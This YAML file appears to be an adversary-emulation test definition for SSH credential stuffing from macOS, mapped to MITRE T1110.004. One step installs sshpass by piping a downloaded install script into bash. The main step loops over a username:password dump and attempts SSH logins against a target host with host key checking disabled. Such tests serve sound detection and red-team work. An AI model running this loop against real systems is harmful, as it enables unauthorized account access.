api_version: "2.0"
name: SSH Credential Stuffing From MacOS
description: |
    Using username,password combination from a password dump to login over SSH.
args:
    - name: target_host
      type: string
      default: localhost
uuid: d546a3d9-0be5-40c7-ad82-5a7d79e1b66b
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1110: Brute Force'
    subtechniques:
        - 'T1110.004: Credential Stuffing'
requirements:
    platforms:
        - os: darwin
steps:
    - name: |
        Requires SSHPASS
      inline: |
        if [ -x "$(command -v sshpass)" ]; then exit 0; else {/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)"
        brew install hudochenkov/sshpass/sshpass
        }; fi;
      executor: bash
    - name: ssh-credential-stuffing-from-macos
      inline: |
        cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
        for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@{{.Args.target_host}};done
      executor: bash
      cleanup:
        inline: ""
        executor: bash
